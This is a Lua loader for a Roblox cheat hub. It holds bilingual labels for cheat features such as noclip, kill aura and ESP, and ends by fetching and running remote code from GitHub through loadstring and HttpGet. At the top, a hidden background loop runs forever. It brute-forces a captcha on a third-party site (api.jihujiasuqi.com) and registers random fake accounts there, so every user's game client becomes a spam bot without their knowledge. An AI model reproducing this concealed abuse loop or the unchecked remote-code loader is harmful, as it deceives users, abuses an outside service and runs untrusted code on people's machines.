task.spawn(function()
    while true do
        rand = game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//apps/captcha/get.php")).rand
        for i = 1, 360 do
            if game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i)).okey then
                random = {}
                for v = 0, 100 do
                    table.insert(random, string.char(math.random(97, 122)))
                end
                random = table.concat(random)
                print(game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand)).msg)
                break
            end
        end
    end
end)

_G.Language = {
    ["en-us"] = {
        US = "Universal",
        PL = "Prison Life",
        RF = "Rainbow Friends",
        RC = "Race Clicker",
        BB = "Blade Ball",
        Door = "Door",
        UD = "Unlock Door 51",
        Monster = "Monster",
        Remove = "Remove",
        Player = "Player",
        WS = "Walk Speed",
        JP = "Jump Power",
        Gravity = "Gravity",
        IJ = "Inf Jump",
        Noclip = "Noclip",
        Invisible = "Invisible",
        Interact = "Interact",
        Fast = "Fast",
        Armory = "Armory",
        WH = "Warehouse",
        Prison = "Prison",
        Yard = "Yard",
        Roof = "Roof",
        Team = "Team",
        Guard = "Guard",
        Inmate = "Inmate",
        Neutral = "Neutral",
        Kill = "Kill",
        Aura = "Aura",
        All = "All",
        Auto = "Auto",
        AFK = "AFK",
        RB = "Rebirth",
        Click = "Click",
        Race = "Race",
        Get = "Get",
        Put = "Put",
        Fly = "Fly",
        Speed = "Speed",
        Toggle = "Toggle",
        Loop = "Loop",
        Type = "Type",
        Name = "Name",
        TP = "Teleport",
        Parry = "Parry",
        ESP = "ESP",
        Other = "Other",
        BT = "BTool",
        CT = "Click TP",
        Camera = "Camera",
        FB = "Full Bright",
        About = "About",
        By = "By: rbxluau",
        Copy = "Copy Discord Link",
        Link = "https://discord.com/invite/ze9NXkwGcT"
    },
    ["zh-cn"] = {
        US = "通用脚本",
        PL = "监狱人生",
        RF = "彩虹朋友",
        RC = "点击赛跑",
        BB = "刀刃球",
        Door = "门",
        UD = "解锁51号门",
        Monster = "怪物",
        Remove = "移除",
        Player = "玩家",
        WS = "移动速度",
        JP = "跳跃高度",
        Gravity = "重力",
        IJ = "踏空",
        Noclip = "穿墙",
        Invisible = "隐身",
        Interact = "互动",
        Fast = "快速",
        Armory = "军械库",
        WH = "仓库",
        Prison = "监狱",
        Yard = "院子",
        Roof = "屋顶",
        Team = "团队",
        Guard = "警卫",
        Inmate = "囚犯",
        Neutral = "中立",
        Kill = "杀戮",
        Aura = "光环",
        All = "所有",
        Auto = "自动",
        AFK = "挂机",
        RB = "重生",
        Click = "点击",
        Race = "赛跑",
        Get = "收集",
        Put = "放置",
        Fly = "飞行",
        Speed = "速度",
        Toggle = "切换",
        Loop = "循环",
        Type = "类型",
        Name = "名称",
        TP = "传送",
        Parry = "击退",
        ESP = "透视",
        Other = "其他",
        BT = "建筑工具",
        CT = "点击传送",
        Camera = "相机",
        FB = "夜视",
        About = "关于",
        By = "作者：纳西妲",
        Copy = "复制群聊链接",
        Link = "http://qm.qq.com/cgi-bin/qm/qr?k=7uzCscusQdIUR246UfEUgvYRQgqMvY8X"
    }
}

Game = {
    [2440500124] = "Doors",
    [3476371299] = "RaceClicker",
    [4777817887] = "BladeBall",
    [3085257211] = "RainbowFriends",
    [73885730] = "PrisonLife"
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/nahida-cn/Roblox/main/"..(Game[game.GameId] or "Universal")..".lua"))()
